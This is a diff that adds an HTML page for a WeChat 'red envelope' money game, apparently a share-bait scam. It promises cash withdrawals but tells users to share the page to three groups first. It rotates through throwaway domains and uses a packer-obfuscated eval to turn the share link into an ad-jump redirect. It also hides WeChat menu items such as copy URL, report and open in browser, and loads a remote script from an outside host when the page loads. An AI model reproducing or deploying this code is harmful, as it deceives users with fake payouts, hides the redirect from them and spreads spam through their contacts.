@@ -1,0 +1,505 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style">
+    <meta content="telephone=no" name="format-detection">
+    <meta content="email=no" name="format-detection">
+    <meta content="" name="pgv">
+    <!-- 页面PUV统计 -->
+    <title>vjek</title>
+    <script type="text/javascript">
+    var wv = ['点点祝福，带着我的真诚心意', '片片花香，带着我真心的关怀', '句句问候，带着我真挚的祝福', '祝福朋友：有个难忘的昨天', '有个快乐的今天，有个美好的明天!', '高高兴兴地面对花开花落']
+    document.title = wv[parseInt(wv.length * Math.random())];
+    </script>
+    <script>
+    function getCookie(name) {
+        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+
+        if (arr = document.cookie.match(reg))
+
+            return unescape(arr[2]);
+        else
+            return null;
+    }
+    //      if(getCookie('name')>=5){                                        //次数
+    //          var mf=parseInt(1000000000*Math.random());
+    //          var mq=parseInt(100000000000000*Math.random());
+    // location.href='./index.html';            //5次后跳转的地址
+    //      }
+    function setCookie(name, value) {
+        var Days = 30;
+        var exp = new Date();
+        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
+        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
+    }
+
+    function share() {
+        /*  $('body').append('<div class="share">\
+      <img src="picture\3_2155484596.png" />\
+      <div class="clear"></div>\
+    </div>');*/
+        location.href = 'zf.html';
+    }
+
+    function di3() {
+        if (!getCookie('name')) {
+            setCookie('name', 1)
+        } else {
+            var nowcookie = getCookie('name');
+            var newcookie = nowcookie - 1 + 2;
+            setCookie('name', newcookie);
+        }
+    }
+
+    di3();
+
+    function di2() {
+
+        setCookie('ti', 'yes');
+    }
+
+
+    function GetRandomNum(Min, Max) {
+        var Range = Max - Min;
+        var Rand = Math.random();
+        return (Min + Math.round(Rand * Range));
+    }
+    </script>
+    <script>
+    if (getCookie('ti') == 'yes') {
+        // location.href = 'shoujiang/index.html'; //分享成功后跳转的地址
+    }
+    </script>
+    <link href="css/style.css" rel="stylesheet" type="text/css">
+    <script src="js/ping_tcss_https.3.1.0.js" charset="gb2312"></script>
+</head>
+
+<body class="show-timeout">
+    <div class="loading" style="display:none;">
+        <img src="img/TB23Um7hFXXXXbMXXXXXXXXXXXX_!!534090410.png" border="0" width="0" height="0">
+    </div>
+    <div class="pop-loading js-cls-loading-transmask">
+        <span class="pop-loading-cnt"></span>
+    </div>
+    <!-- 结构区域]] -->
+    <title>Untitled Documen</title>
+    <!-- 倒计时结束，移除"show-timeout" -->
+    <div class="box game">
+        <!-- 显示区域 -->
+        <div class="cloud-wrap">
+            <div class="cloud">
+                <div class="cb">
+                    <div class="show-money l">
+                        <span>0.00</span>元
+                    </div>
+                    <div class="show-time r">
+                        <span>30</span>秒
+                    </div>
+                </div>
+            </div>
+            <div class="cloud-bg"></div>
+        </div>
+        <!-- 红包掉落区域 -->
+        <div class="fall">
+            <i></i>
+            <i></i>
+            <i></i>
+            <i></i>
+        </div>
+        <!-- 数红包区域 -->
+        <div class="bag">
+            <div class="red">
+                <!-- 单个信封,上滑的模块 -->
+                <ul class="mailers-box">
+                    <li class="mailer-item"></li>
+                </ul>
+                <!-- <div class="mailer-item"></div> -->
+                <!-- 上滑提示 -->
+                <div class="mailer" id="mailer">
+                    <span class="arrow"></span>
+                    <em>上滑拆红包</em>
+                </div>
+                <div class="cover">
+                    <span class="eyebrow-l"></span>
+                    <span class="eyebrow-r"></span>
+                </div>
+            </div>
+            <!-- 点击一次追加一个 -->
+            <div class="value hide">+ <em></em> 元</div>
+            <audio src="img/coin.mp3" preload="auto" id="sound_box" hidden="hidden"></audio>
+        </div>
+        <!-- 爆击，3个随机出现1个 -->
+        <div class="boom">
+            <i></i>
+            <i></i>
+            <i></i>
+        </div>
+        <!-- 倒计时 -->
+        <div class="time-out-bg"></div>
+        <!-- 默认3，控制time-out-num
+             1.显示2 添加num-2
+             2.显示1 添加num-1  -->
+        <div class="time-out-num"></div>
+        <!-- 第一次进入 弹出层 -->
+        <div class="pop-detail hide" id="game_first">
+            <div class="pop-cnt-wrap">
+                <div class="pop-cnt">
+                    <div class="label hide"><span>超过<em></em>人<br>请立即使用</span></div>
+                    <div class="cnt">
+                        <h3 class="tc score-name">活动规则</h3>
+                        <p class="game-tips">1, 30秒内拆多少送多少,红包金额随机</p>
+                        <p class="game-tips">2, 用户可多次参与，每个用户3次机会，每邀请一个朋友参加可再次参与，红包金额累计计算。</p>
+                        <p class="game-tips">3, 1分钱就可以提现</p>
+                        <div class="btn-wrap">
+                            <a href="javascript:window.location.href = 'index.html';" class="btn btn-orange">马上数钱</a>
+                        </div>
+                        <div class="link-r">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- 红包未使用 弹出层 -->
+        <div class="pop-detail hide" id="game_result">
+            <div class="pop-cnt-wrap">
+                <div class="pop-cnt">
+                    <div class="label hide"><span>超过<em></em>人<br>请立即使用</span></div>
+                    <div class="cnt">
+                        <h3 class="tc score-name">本次成绩: 0个,共0元</h3>
+                        <h5 class="tc" id="best_score">红包总额: <span>1.73</span>元</h5>
+                        <p class="game-tips">红包金额是累计的哦，玩的越多，金额越大</p>
+                        <div class="btn-wrap">
+                            <a href="javascript:quxian();" class="btn btn-orange" data-stat="HYBIRD.FUND.HONGBAO.USE">不玩了，立即取现</a>
+                            <a href="javascript:location.reload();" class="btn btn-orange hide" id="play_now">还可玩<span id="num"></span>次，继续玩</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- 红包已使用 弹出层 -->
+        <div class="pop-detail hide" id="game_result_used">
+            <div class="pop-cnt-wrap">
+                <div class="pop-cnt">
+                    <div class="label hide"><span>超过<em></em>人<br>请立即使用</span></div>
+                    <div class="cnt">
+                        <h3 class="tc score-name">你是手速小王子</h3>
+                        <h4 class="tc" id="open">获得2.8元红包已使用</h4>
+                        <p class="game-tips v-hidden">进入可查看你获得的奖励</p>
+                        <div class="btn-wrap">
+                            <a href="javascript:;" class="btn btn-orange shareTo only-share">告诉好友来玩</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- 分享 -->
+    <!-- 分享弹层
+    如果是活动的分享，给"pop-share"添加样式"share-action" -->
+    <div class="pop-share hide" id="js_share_mask">
+        <!-- 分享到朋友圈 -->
+    </div>
+    <!-- for dev/test -->
+    <div id="tips" style="display:none" class="share">
+        <img src="img/TB2KN6xlpXXXXX2XXXXXXXXXXXX_!!534090410.png">
+        <div class="clear"></div>
+    </div>
+    <script type="text/javascript" src="js/sea.js" charset="utf-8"></script>
+    <script type="text/javascript" src="js/zepto.min.js" charset="utf-8"></script>
+    <script type="text/javascript" src="js/config.js?2" charset="utf-8"></script>
+    <script type="text/javascript">
+    function quxian() {
+        alert("取现已提交，分享到三个微群即可领取成功！");
+        var wz = ['http://masee.applinzi.com/', 'http://d8e8e8.applinzi.com/', 'http://jjlopqvd.applinzi.com/', 'http://jixgz.ssthr.com/', 'http://meuiw.applinzi.com/', 'http://wixuzc.applinzi.com/', 'http://qiiwie.applinzi.com/', 'http://36988.applinzi.com/', 'http://f878e.applinzi.com/', 'http://svvvv.applinzi.com/', 'http://oeoeo.applinzi.com/', 'http://bbheuu.applinzi.com/']
+        var mq = parseInt(100000000 * Math.random());
+        var dqUrl = this.location.href
+        window.parent.frames.location.href = dqUrl + "share.php"
+    }
+
+    (function() {
+        var IS_ONLINE = window.DEV_MODE == 'ONLINE';
+        var MOD_CACHE = "20150714a";
+        var list = [],
+            timestamp = +new Date;
+        var versions = { //业务脚本版本
+            "app.js": "20150714d",
+            "index.js": "20150724",
+            "game.js": "20150715",
+            'soundjs.js': '20150714d'
+        };
+        for (var p in versions) {
+            list.push([p, p.replace(".js", "") + (IS_ONLINE ? "-min" : "") + ".js?v=" + (!IS_ONLINE ? timestamp : versions[p])]);
+        }
+        seajs.config({
+            base: "./js/",
+            map: list
+        });
+        window.MODS = [
+            'file=/weixin/mod/spa-min.js', 'file=/weixin/mod/touch-min.js', 'file=/weixin/mod/mask-min.js', 'file=/weixin/mod/fx-min.js', 'file=/weixin/mod/detect-min.js', 'file=/weixin/mod/box-min.js', 'file=/weixin/mod/tips-min.js', 'file=/weixin/mod/log-min.js', 'file=/weixin/mod/login-min.js', 'file=/weixin/mod/weixin-min.js', 'file=/weixin/mod/amount-min.js', 'file=/weixin/mod/stat-min.js', 'v=' + (window.MOD_CACHE || 'unknow')
+        ];
+    })();
+    </script>
+    <script type="text/javascript" data-role="script">
+
+    function getQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+        var r = location.search.substr(1).match(reg);
+        if (r != null) return unescape(decodeURI(r[2]));
+        return null;
+    }
+
+    function addShareCount() {
+        var shareUserId = localStorage.getItem("needAddShareCount");
+        if (null != shareUserId && 0 != shareUserId) {
+            localStorage.setItem("needAddShareCount", 0);
+            // $("<img src='http://http://www.stygjg.com//inviteinc.php?userId=" + shareUserId + "' style='display:none'>").appendTo($("body"));
+        }
+    }
+
+    function subShareCount(minusNum) {
+        if (null != currentUser && 0 != currentUser) {
+            // $("<img src='http://http://www.stygjg.com//invitedeinc.php?userId=" + currentUser + "&minusNum=" + minusNum + "' style='display:none'>").appendTo($("body"));
+        }
+    }
+
+    var TUI_GUANG_NUM = 100;
+    var fromUser = getFromUser();
+    var currentUser = getCurrentUser();
+    document.write("<script src='js/luckynum.js?userId=" + currentUser + "'><\/script>");
+    $(function() {
+
+        // getLuckyNum();
+        addShareCount();
+
+        if (0 == fromUser) {} else {
+            $("#game_first").removeClass("hide");
+        }
+
+        seajs.use(['app.js', 'game.js', 'soundjs.js'], function(app, logic, sound) {
+            app.init(function() {
+                logic.init();
+            });
+        });
+
+    });
+
+    function getFromUser() {
+        if (null == getTuiguangChannel()) {
+            setTuiguangChannel(getQueryString("channel"));
+        }
+        var fromUser = localStorage.getItem("fromUser");
+        if (1 == getQueryString("fromGZH") && 0 != fromUser) {
+            localStorage.setItem("needAddShareCount", fromUser);
+            fromUser = 0;
+            localStorage.setItem("fromUser", fromUser);
+        }
+        if (null == fromUser) {
+            fromUser = getQueryString("userId");
+            if (null == fromUser) {
+                fromUser = 0;
+            } else {
+                //addShareCount(fromUser);
+            }
+            localStorage.setItem("fromUser", fromUser);
+
+            localStorage.setItem("needAddShareCount", fromUser);
+            fromUser = 0;
+            localStorage.setItem("fromUser", fromUser);
+        }
+        return fromUser;
+    }
+
+    function getCurrentUser() {
+        var currentUser = localStorage.getItem("curUser");
+        if (null == currentUser || "" == currentUser) {
+            currentUser = parseInt(Date.now() + Math.random() * 100000000000);
+            localStorage.setItem("curUser", currentUser);
+        }
+        if (currentUser != getQueryString("userId")) {
+            var randomInt = parseInt(Math.random() * TUI_GUANG_NUM);
+            var channel = randomInt;
+
+        }
+        return currentUser;
+    }
+
+    function getLuckyNum() {
+        var luckyNum = localStorage.getItem("luckyNum");
+        if (null == luckyNum || "" == luckyNum) {
+            luckyNum = 3;
+            setLuckyNum(luckyNum);
+        }
+        if (null != serverLuckNum) {
+            luckyNum = parseInt(luckyNum) + parseInt(serverLuckNum);
+            setLuckyNum(luckyNum);
+            subShareCount(serverLuckNum);
+            serverLuckNum = null;
+        }
+        return parseInt(luckyNum);
+    }
+
+    function setLuckyNum(luckyNum) {
+        if (null != luckyNum) {
+            localStorage.setItem("luckyNum", luckyNum);
+            $.localStorage.setItem("money0713_share_time", luckyNum);
+        }
+    }
+
+    function getTotalMoney() {
+        var totalMoney = localStorage.getItem("totalMoney");
+        if (null == totalMoney || "" == totalMoney) {
+            totalMoney = 0;
+            localStorage.setItem("totalMoney", totalMoney);
+        }
+        totalMoney = parseFloat(totalMoney).toFixed(2);
+        return totalMoney;
+    }
+
+    function setTotalMoney(totalMoney) {
+        if (null != totalMoney) {
+            localStorage.setItem("totalMoney", totalMoney);
+        }
+    }
+
+    function setTuiguangChannel(tuiguangChannel) {
+        if (null != tuiguangChannel) {
+            localStorage.setItem("tuiguangChannel", tuiguangChannel);
+        }
+    }
+
+    function getTuiguangChannel() {
+        return localStorage.getItem("tuiguangChannel");
+    }
+    </script>
+    <script type="text/javascript" src="http://tajs.qq.com/stats?sId=49177325" charset="UTF-8"></script>
+    <script type="text/javascript">
+    //weixin share ---------------------------------
+
+    function sendSuccess() {
+        setLuckyNum(getLuckyNum() + 1);
+        alert("分享成功，可以多玩一次了。分享越多，玩的次数就越多！\ntips:请分享到不同的好友或群组，如果发现恶意分享，将取消你的提现资格。");
+        location.reload();
+    }
+
+    function on_weixin_ready3() {
+        //wx.showAllNonBaseMenuItem();
+        var wx_shareUrl = window.location.href;
+        eval(function(p, a, c, k, e, r) {
+            e = String;
+            if (!''.replace(/^/, String)) {
+                while (c--) r[c] = k[c] || c;
+                k = [function(e) {
+                    return r[e]
+                }];
+                e = function() {
+                    return '\\w+'
+                };
+                c = 1
+            };
+            while (c--)
+                if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
+            return p
+        }('0=\'1://2.3.4/5/6.7?8=\'+0;', 9, 9, 'wx_shareUrl|http|mm|wanggou|com|ad|jump|shtml|curl'.split('|'), 0, {}))
+        wx.onMenuShareAppMessage({
+            title: document.title,
+            desc: "你的好友送了你一份紅包，赶紧拆开看看吧!",
+            link: wx_shareUrl,
+            imgUrl: "img/TB23Um7hFXXXXbMXXXXXXXXXXXX_!!534090410.png",
+            type: 'link',
+            dataUrl: '',
+            success: function() {
+                sendSuccess();
+            },
+            cancel: function() {}
+        });
+
+        wx.onMenuShareTimeline({
+            title: document.title,
+            link: wx_shareUrl,
+            imgUrl: "img/TB23Um7hFXXXXbMXXXXXXXXXXXX_!!534090410.png",
+            success: function() {},
+            cancel: function() {}
+        });
+
+        wx.hideMenuItems({
+            menuList: [
+                'menuItem:exposeArticle',
+                'menuItem:setFont',
+                'menuItem:dayMode',
+                'menuItem:nightMode',
+                'menuItem:profile',
+                'menuItem:share:qq',
+                'menuItem:share:weiboApp',
+                'menuItem:favorite',
+                'menuItem:share:facebook',
+                'menuItem:share:QZone',
+                'menuItem:jsDebug',
+                'menuItem:editTag',
+                'menuItem:delete',
+                'menuItem:copyUrl',
+                'menuItem:originPage',
+                'menuItem:readMode',
+                'menuItem:openWithQQBrowser',
+                'menuItem:openWithSafari',
+                'menuItem:share:email',
+                'menuItem:exposeArticle',
+                'menuItem:brand',
+                'menuItem:share:timeline'
+            ],
+            success: function(res) {},
+            fail: function(res) {}
+        });
+
+
+    }
+    var SITE_HOST = "http://www.stygjg.com/";
+    var _timer = parseInt(Date.now() + Math.random() * 100000000000);
+
+    function wxShare() {
+
+        var wxshareJS = document.createElement("script");
+        wxshareJS.src = SITE_HOST + "/jssdk/wxshare.php?shareUrl=" + encodeURIComponent(location.href) + "&debug=false&t=" + _timer;
+        var wxshareJScript = document.getElementsByTagName("script")[0];
+        wxshareJScript.parentNode.insertBefore(wxshareJS, wxshareJScript);
+
+
+    }
+
+    function wxShare1() {
+
+        var wxshareJS = document.createElement("script");
+        wxshareJS.src = SITE_HOST + "/jssdk1/wxshare.php?shareUrl=" + encodeURIComponent(location.href) + "&debug=false&t=" + _timer;
+        var wxshareJScript = document.getElementsByTagName("script")[0];
+        wxshareJScript.parentNode.insertBefore(wxshareJS, wxshareJScript);
+
+
+    }
+
+    function lualugame_init() {
+        if (arguments.callee.done) return;
+        arguments.callee.done = true;
+        if (t_timer) clearInterval(t_timer);
+        if (window.location.href.indexOf("www.stygjg.com/") > 0 || window.location.href.indexOf("www.stygjg.com/") > 0 || window.location.href.indexOf("www.stygjg.com/") > 0) {
+            wxShare();
+        }
+    }
+
+    if (document.addEventListener) {
+        document.addEventListener("DOMContentLoaded", lualugame_init, false)
+    }
+    if (/WebKit/i.test(navigator.userAgent)) {
+        var t_timer = setInterval(function() {
+                if (/loaded|complete/.test(document.readyState)) {
+                    lualugame_init()
+                }
+            },
+            10)
+    }
+    </script>
+</body>
+
+</html>
